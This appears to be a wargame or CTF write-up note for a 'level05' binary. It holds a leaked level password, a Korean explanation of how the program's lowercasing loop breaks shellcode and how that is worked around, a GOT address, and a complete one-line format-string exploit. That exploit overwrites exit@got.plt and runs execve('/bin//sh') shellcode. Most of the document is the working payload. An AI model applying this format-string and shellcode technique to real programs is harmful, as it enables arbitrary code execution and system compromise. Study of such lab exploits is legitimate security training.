> Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

for (int i = 0; i < strlen(s); i++) {
  if (is_upper(s[i])) {
    s[i] = to_lower(s[i]);
  }
}

위 코드때문에 쉘코드의 0x50 (push %eax)가 손상되는데, 그것을 막기 위해서 0x6a 0x00 (pushl 0)으로 대체했다.

0xffffd6dc - stack start

0x80497e0 - <exit@got.plt>

cat <(echo -ne '\xe0\x97\x04\x08....\xe2\x97\x04\x08%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%54946d%hn%10577d%hn\x90\x90\x90\x90\x90\x90\x31\xc0\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80') - | /home/users/level05/level05
